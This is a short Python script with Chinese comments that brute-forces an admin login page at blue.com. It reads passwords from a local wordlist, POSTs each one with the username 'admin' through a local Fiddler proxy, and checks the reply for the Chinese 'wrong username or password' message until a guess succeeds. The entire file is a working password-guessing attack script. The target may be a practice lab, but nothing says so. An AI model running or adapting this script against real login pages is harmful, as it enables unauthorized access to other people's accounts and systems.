import  re
import requests
import bs4
from bs4 import BeautifulSoup
from multiprocessing import Process
def gethtmltext(url,data):
    #构造请求头信息
    header={
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36",
    "Referer":"http://blue.com/admin/login.php?act=login",
    }
    proxies = {
        "https": "http://127.0.0.1:8888"
    }
    try:
        #自定义请求信息
        req=requests.post(url,headers=header,data=data,proxies=proxies,verify=('FiddlerRoot.pem'))
        req.raise_for_status()
        req.encoding=req.apparent_encoding
        return req.text
    except:
        return "连接失败"
def fillUnivList(ulist,html,l):
    soup=BeautifulSoup(html,"html.parser")
    text = soup.find("h4",class_="msg").find(text=True)
    a=text.strip()
    if a!="您输入的用户名和密码有误":
        print("密码正确，密码是{}".format(l))
        return True
    else:
        print("密码错误，密码是{}".format(l))
def run(name):
    print('%s runing' % name)
def main():
    uinfo=[]
    url = r"http://blue.com/admin/login.php"
    f = open(r"D:\Download\1.txt")
    dic = f.readlines()
    for l in dic:
        data = {"admin_name": "admin", "admin_pwd":l,"submit":"%B5%C7%C2%BC","act":"do_login"}
        html = gethtmltext(url, data)
        f=fillUnivList(uinfo,html,l)
        if f:
            break
if __name__ == '__main__':
    main()